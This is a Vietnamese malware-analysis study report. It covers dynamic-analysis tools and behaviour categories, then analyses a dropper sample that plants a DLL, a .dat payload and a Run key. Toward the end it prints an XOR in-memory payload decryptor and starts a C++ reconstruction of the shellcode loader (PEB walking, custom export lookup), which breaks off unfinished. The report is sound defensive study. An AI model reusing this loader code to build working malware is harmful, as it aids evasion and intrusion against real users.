Dynamic Analysis 
1.Định nghĩa
Phân tích động là phương pháp nghiên cứu mã độc bằng cách trực tiếp thực thi mẫu mã độc trong một môi trường cô lập được kiểm soát an toàn để giám sát,ghi nhận và đánh giá toàn bộ hành vi thực tế của nó theo thời gian thực.
1.2. Mục đích
Mục định của việc phân tích động là:
- Quan sát hành vi của mẫu mã độc trong thực tế nó sẽ xác định chính xác mã đọc làm gì khi nào kích hoạt tạo file nào sửa registry ra sao kết nối với ip hay domain nào 
- Giúp nhanh chóng thu thập được các dâu vết xâm nhập như c2,domain,url tải payload,khóa resgistry khởi động phục vụ cho việc điều tra kẻ tấn công
- Phân loại được loại mã độc và mục tiêu tấn công  của chúng để đưa ra phương án tối ưu cho việc ứng phó với sự cố kịp thời
- Giúp hỗ trợ trong quá trình dịch ngược khi payload thực thi gốc trong bộ nhớ và tự giải nén trên trong ram
1.3 Ưu điểm
- Vượt qua kĩ thuật làm rối và nén mã :
Khi mình thực hiện phân tích tính 1 chương trình trở ngại lớn nhất đối với phương pháp này là payload đã được mã hóa,polymorphic hay obfuscated nhưng khi phân tích động chúng buộc phải giải mã về dạng mã máy gốc trong bộ nhớ để chạy khiến việc dịch ngược trở nên dễ dàng
-> từ đó ta có thể thấy được dynamic analysis  giúp chúng ta có thể tiết kiệm được thời gian mà vẫn hiểu được 80% payload thay vì ngồi đọc từng dòng code asm đã bị obfuscated trong ida 
1.4.Hạn chế
Mặc dù ta đã thấy được những ưu điểm của nó là rất lớn nhưng đi đối với nó là những hạn chế cũng mang tiềm ẩn nguy cơ rủi ro rất cao :
- **Nguy cơ lây nhiễm môi trường thật** : Nếu chúng ta  lỡ cấu hình máy ảo không chuẩn để hở mạng nội bộ hay chia sẻ folder với máy thật hoặc con malware nó có kỹ thuật vm escape từ đó nó có thể tiếp cận và xâm nhập với máy thật 
- **Dễ bị đánh lừa bởi kĩ thuật né tránh:**
	- ***Kĩ thuật Anti-Vm-Detection*** :khi nó check được rằng môi trường mà nó đang xâm nhập là VM (bằng cách check được địa chỉ MAC của VM ,số lượng cpu cores, dung lượng ram,hành vi của con chuột nó sẽ nằm im hoặc chúng có cơ chế tự hủy
	-  ***Kĩ thuật time-bomb***: mã độc sẽ gọi sleep hàng tiếng đồng hồ hoặc kiếm tra mốc thời gian hệ thống trong tương lai mới kích hoạt hành vi độc hại
	- Hơn nữa độ bao phủ của kĩ thuật phân tích động còn ***hạn chế nó chỉ quan sát được nhánh thực thi với điều kiện môi tường tại thời điểm chạy***. nếu mã độc yêu cầu tham số dòng lệnh củ thể môi trường domain active directory hoặc lệnh phản hồi từ c2 sever thì hành vi nguy hiểm phía sau sẽ không bao giờ được bộc lộ
 
# 2. Nghiên cứu các công cụ phân tích động

## 2.1. Process Hacker

### Mục đích chính

Process Hacker là công cụ dùng để theo dõi và quản lý sâu các tiến trình đang hoạt động trên hệ thống Windows. So với Task Manager mặc định, công cụ này cung cấp nhiều thông tin chi tiết hơn về process, thread, module, handle, vùng nhớ, service và kết nối mạng.

Trong phân tích mã độc, Process Hacker đặc biệt hữu ích khi cần quan sát hành vi của một tiến trình theo thời gian thực, kiểm tra các DLL được load, thread đang hoạt động hoặc các vùng nhớ có quyền thực thi bất thường.

### Loại dữ liệu thu thập được

Process Hacker có thể cung cấp các thông tin như:

-   Tên process
-   PID và Parent PID
-   Đường dẫn file thực thi
-   Command line
-   User account
-   Integrity level
-   Thread
-   Module/DLL đang được load
-   Handle
-   Memory region
-   Service
-   TCP/UDP connection

### Ví dụ thông tin có giá trị trong phân tích malware

Một process tree bất thường có thể có dạng:

```
WINWORD.EXE
   ↓
powershell.exe
   ↓
cmd.exe
```

Chuỗi process trên có thể cho thấy một tài liệu Office đã kích hoạt PowerShell hoặc Command Prompt.

Một ví dụ khác:

```
explorer.exe
   ↓
Loaded module:
C:\Users\User\AppData\Temp\abc.dll
```

Việc một process hợp lệ như `explorer.exe` load DLL từ thư mục `Temp` hoặc `AppData` là dấu hiệu cần tiếp tục điều tra.

Ngoài ra, vùng nhớ có đặc điểm:

```
MEM_PRIVATE
+
PAGE_EXECUTE_READWRITE
```

cũng đáng chú ý vì có thể liên quan đến shellcode, code đã unpack hoặc process injection.

----------

## 2.2. Process Explorer

### Mục đích chính

Process Explorer là công cụ thuộc bộ Microsoft Sysinternals, được sử dụng để quan sát các process đang chạy và mối quan hệ giữa chúng.

Điểm mạnh của Process Explorer là khả năng hiển thị **process tree** trực quan, giúp analyst nhanh chóng xác định process cha, process con và chuỗi thực thi.

### Loại dữ liệu thu thập được

Process Explorer có thể hiển thị:

-   Process name
-   PID
-   Parent PID
-   Process tree
-   Image path
-   Command line
-   Company name
-   Digital signature
-   Integrity level
-   CPU usage
-   Memory usage
-   DLL/module đang load
-   Open handle

### Ví dụ thông tin có giá trị trong phân tích malware

Ví dụ:

```
explorer.exe
   ↓
sample.exe
      ↓
powershell.exe
         ↓
cmd.exe
```

Từ process tree này, analyst có thể xác định được:

-   Process nào sinh ra process nào
-   Chương trình được thực thi từ đường dẫn nào
-   Command line có tham số bất thường hay không
-   File có chữ ký số hay không
-   Process đã load các DLL nào

Một ví dụ khác:

```
Process:
svchost.exe

Loaded DLL:
C:\Users\User\AppData\Roaming\unknown.dll
```

DLL lạ nằm trong thư mục của user nhưng được load vào `svchost.exe` là một artifact đáng điều tra.

----------

## 2.3. Process Monitor

### Mục đích chính

Process Monitor (Procmon) là một trong những công cụ quan trọng nhất trong phân tích động trên Windows. Công cụ này theo dõi hoạt động hệ thống theo thời gian thực và tập trung vào các nhóm hành vi như:

-   File system
-   Registry
-   Process
-   Thread
-   Image loading

Procmon rất hữu ích để phát hiện file được tạo, Registry bị chỉnh sửa hoặc process mới được sinh ra sau khi chạy mẫu mã độc.

### Loại dữ liệu thu thập được

Trường dữ liệu

Ý nghĩa

Time

Thời điểm event xảy ra

Process Name

Process thực hiện hành vi

PID

Process ID

Operation

Loại hành động

Path

File hoặc Registry path liên quan

Result

Kết quả thao tác

Detail

Thông tin chi tiết

Một số operation thường gặp:

```
CreateFile
WriteFile
ReadFile
DeleteFile

RegOpenKey
RegQueryValue
RegSetValue
RegCreateKey

Process Create
Process Exit

Load Image
```

### Ví dụ thông tin có giá trị trong phân tích malware

#### Phát hiện file drop

```
sample.exe
WriteFile
C:\Users\User\AppData\Roaming\payload.exe
SUCCESS
```

Thông tin này cho thấy sample đã ghi một executable xuống hệ thống.

#### Phát hiện Registry persistence

```
sample.exe
RegSetValue
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater
SUCCESS
```

Event này có thể liên quan đến cơ chế persistence thông qua Registry Run Key.

#### Phát hiện DLL được load

```
sample.exe
Load Image
C:\Users\User\AppData\Temp\evil.dll
```

Điều này giúp analyst xác định các module được load trong runtime.

----------
## 2.3.1. Tổng quan lại Process hacker , process explorer , process monitor
Nhìn qua ta có cảm giác 3 tools này trông có vẻ giống nhau về mặt công dụng nhưng chúng lại có mục đích riêng biệt trong việc phân tích malware.

 1. **Process hacker** : chúng chuyên dùng để phân tích trong process chúng đang làm gì kiểm tra các thread,module,handle,memory,service,nework
 2. **Process explorer** : công cụ có tác dụng để quan sát process tree và process cha con dữ liệu nổi bật là pid,ppid,cmd, dll,signature.tóm lại công cụ này để phân tích process nào được sinh ra bởi process nào 
 3. **Process monitor** : ghi lại hoạt động hệ thóng theo thời gian thực , dữ liệu nổi bật trong công cụ này là file,registry process, thread , image load. Loại này thường được dùng để xem rằng process có tác động gì đến hệ thống 

## 2.4. Autoruns

### Mục đích chính

Autoruns là công cụ thuộc bộ Microsoft Sysinternals, được sử dụng để kiểm tra các vị trí tự khởi động trên Windows.

Trong phân tích malware, Autoruns đặc biệt hữu ích để xác định các cơ chế **persistence** mà mã độc sử dụng để tự chạy lại sau khi reboot hoặc user đăng nhập.

### Loại dữ liệu thu thập được

Autoruns có thể hiển thị các nhóm autostart như:

-   Logon
-   Services
-   Drivers
-   Scheduled Tasks
-   Explorer
-   Winlogon
-   AppInit DLLs
-   Image Hijacks
-   Office Add-ins
-   WMI

Thông tin có thể thu thập bao gồm:

-   Tên autostart entry
-   Registry location
-   File path
-   Publisher
-   Digital signature
-   Description
-   Timestamp
-   Image path

### Ví dụ thông tin có giá trị trong phân tích malware

#### Registry Run Key

```
Logon
Updater
C:\Users\User\AppData\Roaming\abc.exe
```

Entry trên có thể là dấu hiệu của Registry Run Key persistence.

#### Scheduled Task

```
Scheduled Tasks
WindowsUpdateCheck
C:\ProgramData\payload.exe
```

Task có tên giống thành phần Windows nhưng trỏ tới file lạ là dấu hiệu đáng chú ý.

#### Service

```
Services
FakeUpdate
C:\Users\Public\service.exe
```

Một service trỏ tới executable nằm trong thư mục user-writable cần được kiểm tra thêm.

Autoruns rất phù hợp để so sánh trạng thái hệ thống:

```
Before infection
vs
After infection
```

qua đó xác định entry mới xuất hiện sau khi chạy sample.

----------

## 2.5. Wireshark

### Mục đích chính

Wireshark là công cụ dùng để bắt và phân tích lưu lượng mạng ở mức packet.

Trong phân tích malware, Wireshark giúp xác định các hoạt động như:

-   Kết nối tới C2
-   Truy vấn DNS
-   Tải thêm payload
-   Gửi dữ liệu ra ngoài
-   Beaconing
-   Giao tiếp qua các giao thức khác nhau

### Loại dữ liệu thu thập được

Wireshark có thể hiển thị:

-   Source IP
-   Destination IP
-   Source port
-   Destination port
-   Protocol
-   DNS query
-   HTTP request
-   TLS connection
-   TCP stream
-   UDP traffic
-   Packet payload nếu không được mã hóa

Một số protocol thường gặp:

```
DNS
HTTP
HTTPS/TLS
TCP
UDP
SMB
ICMP
```

### Ví dụ thông tin có giá trị trong phân tích malware

#### DNS Query

```
DNS Query:
evil.example
```

Thông tin này có thể được sử dụng như một domain IOC.

#### HTTP Request

```
GET /gate.php?id=123 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
```

Từ request trên có thể thu thập:

-   Domain
-   URL path
-   User-Agent
-   Victim ID

#### TCP Connection

```
192.168.1.10:50234
        ↓
203.0.113.10:443
```

Thông tin này giúp xác định IP đích, port và giao thức mà malware sử dụng.

----------

## 2.6. HTTP Debugger

### Mục đích chính

HTTP Debugger là công cụ dùng để theo dõi và phân tích traffic HTTP/HTTPS theo dạng request và response.

Nếu Wireshark mạnh ở mức packet và hỗ trợ nhiều protocol, HTTP Debugger tập trung nhiều hơn vào **logic giao tiếp HTTP**, giúp analyst đọc request và response trực quan hơn.

### Loại dữ liệu thu thập được

HTTP Debugger có thể hiển thị:

-   URL
-   Domain
-   HTTP method
-   Request header
-   Response header
-   Cookies
-   User-Agent
-   Query parameters
-   Request body
-   Response status
-   Response body

### Ví dụ thông tin có giá trị trong phân tích malware

Ví dụ malware gửi request:

```
POST /api/checkin HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
```

Request body:

```
id=ABC123
user=admin
computer=DESKTOP-01
```

Từ dữ liệu trên, analyst có thể xác định:

```
C2 domain:
example.com

Endpoint:
/api/checkin

Method:
POST

Victim ID:
ABC123
```

Một ví dụ khác:

```
GET /payload.bin HTTP/1.1
Host: example.com
```

Request này có thể cho thấy sample đang tải thêm payload từ máy chủ từ xa.

----------

# Bảng so sánh tổng hợp

Công cụ

Mục đích chính

Dữ liệu thu thập được

Giá trị trong phân tích malware

**Process Hacker**

Phân tích sâu process

Process, thread, module, handle, memory, network

Phát hiện injection, DLL lạ, vùng nhớ đáng ngờ

**Process Explorer**

Quan sát process tree

PID, PPID, command line, DLL, signature

Xác định quan hệ parent-child và process bất thường

**Process Monitor**

Theo dõi hoạt động hệ thống

File, Registry, process, thread, image load

Phát hiện file drop, Registry modification, process creation

**Autoruns**

Phát hiện autostart/persistence

Run key, Service, Task, Driver, WMI

Xác định cơ chế persistence

**Wireshark**

Phân tích traffic mạng

IP, port, domain, protocol, packet

Phát hiện C2, DNS, exfiltration, payload download

**HTTP Debugger**

Phân tích HTTP/HTTPS

URL, header, request, response, body

Phát hiện C2 HTTP, API endpoint, dữ liệu truyền nhận

----------

# Nhận xét tổng hợp

Không có một công cụ đơn lẻ nào có thể cung cấp đầy đủ toàn bộ hành vi của malware. Trong thực tế, analyst thường kết hợp nhiều công cụ để xây dựng một bức tranh hoàn chỉnh.

Một workflow phân tích động có thể được thực hiện như sau:

```
Process Explorer / Process Hacker
        ↓
Xác định process và process tree
        ↓
Process Monitor
        ↓
Theo dõi File + Registry + Process
        ↓
Autoruns
        ↓
Kiểm tra persistence
        ↓
Wireshark
        ↓
Phân tích IP / Domain / Protocol
        ↓
HTTP Debugger
        ↓
Phân tích HTTP request / response
```

Có thể ghi nhớ ngắn gọn:

```
Process Hacker
→ Process + Memory + Thread

Process Explorer
→ Process Tree + DLL

Process Monitor
→ File + Registry

Autoruns
→ Persistence

Wireshark
→ Network Packet

HTTP Debugger
→ HTTP Request / Response
```

Việc kết hợp các công cụ trên giúp analyst xác định được cả hành vi trên máy nạn nhân lẫn hành vi giao tiếp mạng, từ đó thu thập IOC và xây dựng behavioral profile của mẫu mã độc
Dưới đây là phần có thể đưa gần như nguyên văn vào báo cáo.

# 3. Các nhóm hành vi quan trọng khi phân tích động

Trong phân tích động, mục tiêu không chỉ là xác định malware có chạy hay không mà quan trọng hơn là quan sát **nó đã làm gì sau khi được thực thi**. Các hành vi thường được chia thành nhiều nhóm để analyst dễ theo dõi và xây dựng behavioral profile của mẫu.

Sáu nhóm quan trọng gồm:

-   Process / Injection
-   File System
-   Registry
-   Persistence
-   Network
-   Anti-analysis / Evasion

----------

## 3.1. Process / Injection

### Nội dung cần quan sát

Nhóm này tập trung vào các process và thread được tạo ra trong quá trình malware hoạt động.

Các thông tin quan trọng gồm:

-   Process nào được tạo
-   Parent process là gì
-   Child process là gì
-   Command line được sử dụng
-   Thread mới được tạo
-   DLL/module được load
-   Process khác có bị mở hay không
-   Có thao tác ghi vào memory của process khác hay không
-   Có process injection hoặc process hollowing hay không

Ví dụ process tree:

```
explorer.exe
   ↓
sample.exe
   ↓
powershell.exe
   ↓
cmd.exe
```

Một số API đáng chú ý:

```
CreateProcess
OpenProcess
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
GetThreadContext
SetThreadContext
ResumeThread
QueueUserAPC
```

### Process Injection là gì?

Process Injection là kỹ thuật đưa code vào một process khác để code của malware chạy bên trong process đó.

Ví dụ:

```
malware.exe
    ↓
OpenProcess(explorer.exe)
    ↓
VirtualAllocEx
    ↓
WriteProcessMemory
    ↓
CreateRemoteThread
    ↓
code chạy trong explorer.exe
```

Malware có thể lợi dụng các process hợp lệ như:

```
explorer.exe
svchost.exe
notepad.exe
rundll32.exe
```

để che giấu hoạt động.

### Vì sao nhóm này quan trọng?

Process behavior giúp analyst hiểu được **execution flow** của malware.

Ví dụ, nếu chỉ thấy:

```
sample.exe
```

thì chưa biết nhiều.

Nhưng nếu quan sát thấy:

```
sample.exe
   ↓
CreateProcess
   ↓
powershell.exe
   ↓
download payload
```

thì đã có thể hiểu malware sử dụng PowerShell như một thành phần trung gian.

Injection còn đặc biệt quan trọng vì malware thường dùng kỹ thuật này để:

-   Ẩn code trong process hợp lệ
-   Né antivirus/EDR
-   Làm process tree khó phân tích
-   Chạy dưới context của process khác
-   Che giấu executable ban đầu

Do đó, Process / Injection là một trong những nhóm hành vi quan trọng nhất khi phân tích malware.

----------

## 3.2. File System

### Nội dung cần quan sát

File System behavior bao gồm các thao tác của malware đối với file và thư mục.

Ví dụ:

-   Tạo file
-   Đọc file
-   Ghi file
-   Xóa file
-   Copy file
-   Rename file
-   Tạo thư mục
-   Drop DLL hoặc EXE
-   Ghi file cấu hình
-   Tạo temporary file

Các API thường gặp:

```
CreateFile
ReadFile
WriteFile
DeleteFile
CopyFile
MoveFile
CreateDirectory
FindFirstFile
FindNextFile
```

### Ví dụ

Malware ban đầu:

```
sample.exe
```

sau khi chạy tạo:

```
C:\Users\User\AppData\Roaming\update.exe
```

Flow:

```
sample.exe
   ↓
CreateFile
   ↓
WriteFile
   ↓
C:\Users\User\AppData\Roaming\update.exe
```

Đây có thể là hành vi **drop payload**.

Một malware khác có thể:

```
FindFirstFile
   ↓
FindNextFile
   ↓
*.docx
*.xlsx
*.pdf
   ↓
WriteFile
```

Hành vi này có thể liên quan đến tìm kiếm hoặc chỉnh sửa dữ liệu người dùng.

### Vì sao nhóm này quan trọng?

Malware thường cần tương tác với file system để:

-   Drop payload
-   Lưu configuration
-   Lưu dữ liệu thu thập được
-   Tạo persistence
-   Load DLL
-   Mã hóa file
-   Xóa dấu vết
-   Sao chép chính nó

Ngoài ra, file path còn là IOC có giá trị.

Ví dụ:

```
C:\Users\User\AppData\Roaming\svchost.exe
```

là một đường dẫn đáng nghi vì `svchost.exe` hợp lệ thường nằm trong thư mục hệ thống, không phải `AppData`.

----------

## 3.3. Registry

### Nội dung cần quan sát

Windows Registry lưu rất nhiều thông tin cấu hình của hệ điều hành và ứng dụng.

Malware có thể:

-   Mở Registry key
-   Đọc Registry value
-   Tạo key
-   Tạo value
-   Sửa value
-   Xóa key/value

Một số API:

```
RegOpenKeyEx
RegCreateKeyEx
RegQueryValueEx
RegSetValueEx
RegDeleteValue
RegDeleteKey
```

### Ví dụ

Malware ghi:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Value:

```
Updater = C:\Users\User\AppData\Roaming\payload.exe
```

Flow:

```
sample.exe
   ↓
RegCreateKeyEx
   ↓
RegSetValueEx
   ↓
Run Key
   ↓
payload chạy khi user login
```

Registry cũng có thể được dùng để lưu configuration:

```
HKCU\Software\SomeName
    Server = example.com
    Port   = 443
    ID     = ABC123
```

### Vì sao nhóm này quan trọng?

Registry có thể cung cấp thông tin về:

-   Persistence
-   Malware configuration
-   Service configuration
-   COM hijacking
-   System discovery
-   C2 configuration
-   Trạng thái hoạt động của malware

Registry artifact thường rất hữu ích trong DFIR vì chúng có thể vẫn tồn tại ngay cả sau khi process malware đã kết thúc.

----------

## 3.4. Persistence

### Persistence là gì?

Persistence là khả năng giúp malware **tiếp tục chạy lại sau khi process bị đóng, user đăng nhập lại hoặc hệ thống reboot**.

Ví dụ:

```
Malware chạy
   ↓
tạo Registry Run Key
   ↓
máy reboot
   ↓
user login
   ↓
malware chạy lại
```

### Các persistence technique thường gặp

-   Registry Run / RunOnce
-   Startup Folder
-   Scheduled Tasks
-   Services
-   Drivers
-   Winlogon
-   WMI
-   COM Hijacking
-   Office Add-ins
-   Image File Execution Options

Ví dụ Registry Run Key:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Ví dụ Service:

```
HKLM\SYSTEM\CurrentControlSet\Services\malware.exe
```

Ví dụ Scheduled Task:

```
Task Scheduler
   ↓
WindowsUpdateCheck
   ↓
C:\ProgramData\payload.exe
```

### Vì sao nhóm này quan trọng?

Persistence giúp malware tồn tại lâu dài trên hệ thống.

Nếu malware không có persistence:

```
malware.exe
   ↓
process terminate
   ↓
malware ngừng hoạt động
```

Nếu có persistence:

```
malware.exe
   ↓
install persistence
   ↓
reboot
   ↓
Windows trigger
   ↓
malware chạy lại
```

Do đó persistence là một dấu hiệu rất quan trọng khi điều tra sự xâm nhập lâu dài.

Các persistence artifact cũng có giá trị cao cho detection và incident response.

----------

## 3.5. Network

### Nội dung cần quan sát

Malware thường cần giao tiếp qua mạng để:

-   Kết nối C2
-   Download payload
-   Nhận command
-   Upload dữ liệu
-   Kiểm tra Internet
-   Đăng ký victim
-   Beaconing

Các thông tin cần quan sát:

-   Destination IP
-   Domain
-   Port
-   Protocol
-   URL
-   DNS query
-   HTTP method
-   HTTP headers
-   User-Agent
-   Request body
-   Response body

Một số API thường gặp:

```
WinHttpOpen
WinHttpConnect
WinHttpOpenRequest
WinHttpSendRequest
WinHttpReceiveResponse
WinHttpReadData

InternetOpen
InternetConnect
HttpSendRequest

socket
connect
send
recv
```

### Ví dụ

```
sample.exe
   ↓
DNS Query
   ↓
example.com
   ↓
TCP 443
   ↓
HTTPS
```

Hoặc:

```
POST /api/checkin HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
```

Body:

```
id=ABC123&user=admin
```

Có thể đây là victim registration.

Một flow điển hình:

```
Victim
   ↓
Beacon
   ↓
C2 Server
   ↓
Command
   ↓
Victim executes command
```

### Vì sao nhóm này quan trọng?

Network behavior có thể tiết lộ:

-   C2 infrastructure
-   Domain
-   IP
-   URL
-   Protocol
-   Beacon pattern
-   Payload download
-   Data exfiltration

Đây đều là IOC rất có giá trị cho:

-   Threat hunting
-   Firewall blocking
-   IDS/IPS
-   EDR detection
-   Incident response

----------

## 3.6. Anti-analysis / Evasion

### Anti-analysis là gì?

Anti-analysis là các kỹ thuật malware sử dụng để phát hiện hoặc gây khó khăn cho môi trường phân tích.

Malware có thể kiểm tra:

-   Debugger
-   Virtual Machine
-   Sandbox
-   Monitoring tools
-   Hardware
-   Username
-   Computer name
-   Thời gian chạy

Một số API thường gặp:

```
IsDebuggerPresent
CheckRemoteDebuggerPresent
NtQueryInformationProcess
GetTickCount
QueryPerformanceCounter
Sleep
OutputDebugString
```

Malware cũng có thể kiểm tra:

```
VMware
VirtualBox
CPU count
RAM size
Disk size
Process list
Username
Computer name
```

### Ví dụ

```
sample.exe
   ↓
IsDebuggerPresent()
   ↓
TRUE
   ↓
ExitProcess()
```

Analyst có thể chạy malware và thấy:

```
"Không có hành vi gì."
```

Nhưng thực tế là malware đã phát hiện debugger và tự thoát.

Một kỹ thuật khác:

```
sample.exe
   ↓
Sleep(1 hour)
   ↓
Sandbox timeout
   ↓
payload không bao giờ được kích hoạt
```

### Evasion

Malware cũng có thể cố né detection bằng:

-   Process injection
-   Packing
-   Encryption
-   Dynamic API resolution
-   API hashing
-   Obfuscated strings
-   DLL sideloading
-   Living-off-the-land binaries

Ví dụ:

```
malware
   ↓
GetProcAddress
   ↓
VirtualAllocEx
```

thay vì import trực tiếp `VirtualAllocEx`.

### Vì sao nhóm này quan trọng?

Anti-analysis có thể khiến analyst đưa ra kết luận sai.

Ví dụ:

```
Run sample
   ↓
Không thấy network
   ↓
Kết luận: malware không có network
```

Trong khi thực tế:

```
sample
   ↓
detect VMware
   ↓
disable C2 behavior
```

Do đó khi một sample có hành vi quá ít hoặc khác với static analysis, analyst cần kiểm tra khả năng:

```
Anti-VM
Anti-Debug
Sleep
Conditional execution
Environment checks
```

----------

# Bảng tổng hợp

Nhóm hành vi

Quan sát chính

Tại sao quan trọng

**Process / Injection**

Process, thread, memory, module

Xác định execution flow và phát hiện injection

**File System**

File create/read/write/delete

Phát hiện payload, config, dữ liệu và IOC

**Registry**

Key/value read-write

Phát hiện configuration và persistence

**Persistence**

Run key, service, task, WMI...

Xác định cách malware tồn tại sau reboot/login

**Network**

IP, domain, URL, protocol

Phát hiện C2, download và exfiltration

**Anti-analysis / Evasion**

VM/debugger check, sleep, obfuscation

Tránh bỏ sót hoặc hiểu sai behavior

Có thể hình dung toàn bộ quá trình:

```
                  Malware
                     │
        ┌────────────┼────────────┐
        ↓            ↓            ↓
     Process        File       Registry
        │            │            │
        ↓            ↓            ↓
    Injection     Payload      Persistence
        │                         │
        └────────────┬────────────┘
                     ↓
                  Network
                     ↓
                    C2

          Anti-analysis / Evasion
            bao quanh toàn bộ flow
```

Trong thực tế, các nhóm hành vi này thường liên kết với nhau chứ không xuất hiện độc lập. Ví dụ malware có thể **tạo process mới → drop file → ghi Registry để persistence → kết nối C2 → inject vào process hợp lệ**, vì vậy việc quan sát đồng thời nhiều nhóm hành vi giúp analyst hiểu đầy đủ hơn về chức năng và mục đích của mẫu mã độc.
II. Phân tích mã độc |
Mẫu 1

 Ta có  sau : <img width="1264" height="957" alt="image" src="https://github.com/user-attachments/assets/631b42cb-d6e5-459b-88ba-04ccba8d7285" />
 <img width="713" height="70" alt="image" src="https://github.com/user-attachments/assets/998dfec5-7748-4ed0-93b8-c3afe9ba3d89" />
 ta có thể thấy sau khi chạy 123 .exe nó đã dropper ra 1 con mang tên obedience.exe và 2 file payload dll và .dat
  Tiếp đến ta sử dụng công cụ autoruns để nó ghi thêm gì vào registry 
<img width="1024" height="768" alt="image" src="https://github.com/user-attachments/assets/08f9bbf0-3356-4cd0-98d8-092935de57d6" />

Nhìn ảnh ta có thể thấy nó tạo persitance bằng cách regcreatekey tại startup
Tiếp đến ta sẽ dùng process hacker để phân tích file obidence nó làm gì
vào thanh memory ta thấy được 
nó load 1 file startburn .dll đáng nghi vì nó nhẹ 1 cách bất thường so với bản gốc của nó

<img width="743" height="363" alt="image" src="https://github.com/user-attachments/assets/2a9503e1-208e-4e74-9dde-139c027dd748" />
<img width="911" height="142" alt="image" src="https://github.com/user-attachments/assets/bec6c228-4fe3-43c6-80e9-03f35884becc" />

Đồng thời ta còn thấy được 1 file có security là rwx  thông thường 1 file rất ít khi dùng quyền này
 ```
 0x2330000, Private: Commit, 4 kB,   RWX, , 4 kB,   4 kB, , , 
0x2740000, Private: Commit, 252 kB, RWX, Heap segment 32-bit (ID 3), 252 kB, 252 kB, , , 
```

bởi vì con này tắt quá nhanh nên việc dump ra rất khó nên tôi chuyển qua phân tích IDA
Đây là mã giả đoạn đó 
```
 sub_4044B0 proc near
arg_0= dword ptr  8
arg_4= dword ptr  0Ch
arg_8= dword ptr  10h
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_8]
mov     edx, [ebp+arg_4]
push    eax
mov     eax, [ebp+arg_0]
push    edx
push    eax
call    sub_408331
push    0               ; int
push    offset aHandkerchiefDa ; "handkerchief.dat"
push    offset aStarburnDll ; "StarBurn.dll"
push    offset aObedienceExe ; "obedience.exe"
mov     ecx, offset unk_76E054
call    sub_403DF0
push    834h            ; dwMilliseconds
call    ds:Sleep
push    0               ; Code
call    _exit
sub_4044B0 endp
```
nhìn qua t có thể phóng đoán rằng file .dll kia chắc để load payload trong file .dat ta đặt breakpoint vào hàm mov
quay lại bạn đầu ta nhớ rằng nó còn payload 4kb tại hàm 0x2740000
trong file tĩnh tôi đã tìm được nó 
```
BOOL DecryptPayloadMemory(LPBYTE lpBuffer, DWORD dwSize)
{
    DWORD oldProtect;
    
    // Đổi thuộc tính trang nhớ sang RWX để vừa ghi đè vừa chạy được code
    VirtualProtect(lpBuffer, dwSize, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Vòng lặp giải mã XOR trực tiếp trên RAM
    for (DWORD i = 0; i < dwSize; i++)
    {
        lpBuffer[i] ^= GetKeyByte(i); // Giải mã từng byte
    }

    return TRUE;
}
```
đây là mã giả của đoạn code đó tức là nó sẽ giải toàn bộ file .dat để thực hiện payload
tiếp theo ta sẽ dựng lại 2 file này theo c++ :
Đây là file payload chính có đuối .dat
```

#include <windows.h>
#include <winternl.h>

// Định nghĩa cấu trúc con trỏ hàm API nội bộ để Shellcode tự phân giải (API Hashing)
typedef HMODULE (WINAPI *pfnLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC (WINAPI *pfnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef LPVOID  (WINAPI *pfnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL    (WINAPI *pfnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

/**
 * Cấu trúc Base Relocation trong tệp PE
 */
typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

/**
 * Tự động tìm nạp Base Address của kernel32.dll từ PEB (Position Independent Code)
 */
HMODULE GetKernel32Base() {
    PPEB pPeb = NULL;
#if defined(_M_IX86)
    __asm {
        mov eax, fs:[0x30]
        mov pPeb, eax
    }
#elif defined(_M_AMD64)
    pPeb = (PPEB)__readgsqword(0x60);
#endif

    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pCurrent = pListHead->Flink;

    // Duyệt danh sách DLL đã nạp (Thứ tự: ntdll.dll -> kernel32.dll)
    while (pCurrent != pListHead) {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (pEntry->FullDllName.Buffer != NULL) {
            // Kiểm tra tên DLL chứa "KERNEL32" hoặc "kernel32"
            WCHAR* name = pEntry->FullDllName.Buffer;
            if (name[0] == L'K' || name[0] == L'k') {
                return (HMODULE)pEntry->DllBase;
            }
        }
        pCurrent = pCurrent->Flink;
    }
    return NULL;
}

/**
 * Tự tìm hàm GetProcAddress trong Export Directory của kernel32.dll
 */
FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pNames = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
    DWORD* pFunctions = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);
    WORD*  pOrdinals = (WORD*)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* szName = (char*)((BYTE*)hModule + pNames[i]);
        if (strcmp(szName, lpProcName) == 0) {
            WORD ordinal = pOrdinals[i];
            return (FARPROC)((BYTE*)hModule + pFunctions[ordinal]);
        }
    }
    return NULL;
}

